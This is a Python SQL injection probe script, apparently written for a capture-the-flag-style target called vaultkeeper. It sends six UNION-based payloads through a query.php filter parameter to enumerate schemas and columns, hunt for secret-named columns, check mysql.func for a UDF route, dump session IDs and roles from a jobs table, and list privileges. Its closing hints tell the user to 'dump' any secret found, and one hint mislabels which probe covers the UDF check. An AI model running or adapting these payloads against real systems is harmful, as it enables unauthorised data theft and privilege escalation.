#!/usr/bin/env python3
"""
Angle 3, the two SQL questions probe_remote_angle3.py test G doesn't ask.

Test G sweeps information_schema.TABLES. These two ask the other half of the
"re-audit the SQLi" brief:
  1 COLUMNS, not tables. If the deployed build keeps the unseal handshake or any
    cap material in the database, the giveaway is a COLUMN called mask / cap_key
    / seal / unseal / secret in a table whose name looks innocent. Test G would
    miss that.
  2 CREATE FUNCTION and mysql.func. The ledger closed FILE, secure_file_priv and
    LOAD DATA LOCAL INFILE but never asked whether a UDF is reachable. The error
    STRING is the answer, so a failed CREATE FUNCTION is a successful probe.

Six requests, 0.6 s apart. Everything runs through /api/query.php, which is the
multi-statement SQLi as vk_restore, already proven on the deployed build.

    python3 angle3_sql_extra.py --base http://<host>
"""
from __future__ import annotations

import argparse
import json
import time
import urllib.error
import urllib.parse
import urllib.request

PACE = 0.6

PROBES = [
    # 1 every column in every non-system schema. On the handout this is exactly
    #   vk_restore.catalog.{id,name,bytes,kind}. Anything else is new.
    ("columns/non-system",
     "1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(DISTINCT CONCAT(table_schema,'.',table_name,'.',column_name)) "
     "FROM information_schema.columns WHERE table_schema NOT IN "
     "('information_schema','performance_schema','sys','mysql')),3,4-- "),

    # 2 any column ANYWHERE, including a schema whose tables we can't read,
    #   whose name smells of the missing secret. information_schema.columns is
    #   privilege-filtered, so a hit here also proves we can read that table.
    ("columns/named like the secret",
     "1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(DISTINCT CONCAT(table_schema,'.',table_name,'.',column_name)) "
     "FROM information_schema.columns WHERE column_name REGEXP "
     "'^(cap|mask|seal|unseal|vault|secret|token|keyring)' ),3,4-- "),

    # 3 can this user see the vaultkeeper schema at all, by any route
    ("schemata visible",
     "1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata),3,4-- "),

    # 4 UDF: is mysql.func readable, i.e. is a udf_payload route even conceivable
    ("mysql.func readable",
     "1=2 UNION SELECT 1,IFNULL((SELECT GROUP_CONCAT(name,':',dl) FROM mysql.func),'no-rows-or-denied'),3,4-- "),

    # 5 Can vk_restore touch the jobs table directly? If the deployed GRANT is
    #   wider than the handout's this dumps session_id:role and stage E's
    #   maintainer-cap gate stops mattering. A 1142 'SELECT command denied' is
    #   the handout behaviour and closes it.
    ("vaultkeeper.jobs reachable as vk_restore",
     "1=2 UNION SELECT 1,IFNULL((SELECT GROUP_CONCAT(CONCAT(session_id,':',role)) "
     "FROM vaultkeeper.jobs),'empty'),3,4-- "),

    # 6 global privileges verbatim, so nobody has to trust a paraphrase
    ("SHOW GRANTS equivalent",
     "1=2 UNION SELECT 1,(SELECT GROUP_CONCAT(CONCAT(privilege_type,'@',IFNULL(table_schema,'*'))) "
     "FROM information_schema.schema_privileges),3,4-- "),
]


def get(url, timeout=20):
    time.sleep(PACE)
    r = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    try:
        resp = urllib.request.urlopen(r, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return 0, f"ERR {e!r}"


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True)
    a = ap.parse_args()
    base = a.base.rstrip("/")
    for label, sql in PROBES:
        code, body = get(base + "/api/query.php?filter=" + urllib.parse.quote(sql, safe=""))
        out = body
        try:
            j = json.loads(body)
            rows = j.get("results") or []
            out = rows[0].get("name") if rows else (j.get("error") or json.dumps(j))
        except Exception:  # noqa: BLE001
            pass
        print(f"\n--- {label}  [{code}]\n{str(out)[:1200]}")
    print("\nread:")
    print("  a column named mask/cap/unseal anywhere  -> the mask is IN THE DB, dump it")
    print("  vaultkeeper.* visible in probe 1 or 3    -> deployed grants are wider than")
    print("                                              the handout's, jobs is writable")
    print("                                              and stage E needs no cap at all")
    print("  'command denied' on probe 5              -> UDF closed, stop asking")


if __name__ == "__main__":
    main()
